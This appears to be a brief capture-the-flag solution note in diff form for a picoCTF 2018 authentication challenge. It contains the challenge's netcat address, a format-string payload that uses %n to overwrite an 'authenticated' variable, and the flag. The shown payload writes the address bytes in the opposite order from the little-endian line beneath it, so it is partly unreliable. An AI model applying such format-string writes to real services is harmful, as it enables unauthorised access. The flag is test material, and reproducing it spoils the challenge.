@@ -1,0 +1,9 @@
+Can you authenticate [1]  to this service and get the flag? Connect with
+nc 2018shell.picoctf.com 52918. Source [2] .
+
+authenticated = 0x0804a04c
+
+\x08\x04\xa0\x4c %x %x %x %x %x %x %x %x %x %x %x %x %11$n
+\x4c\xa0\x04\x08
+
+picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_d29a706d}
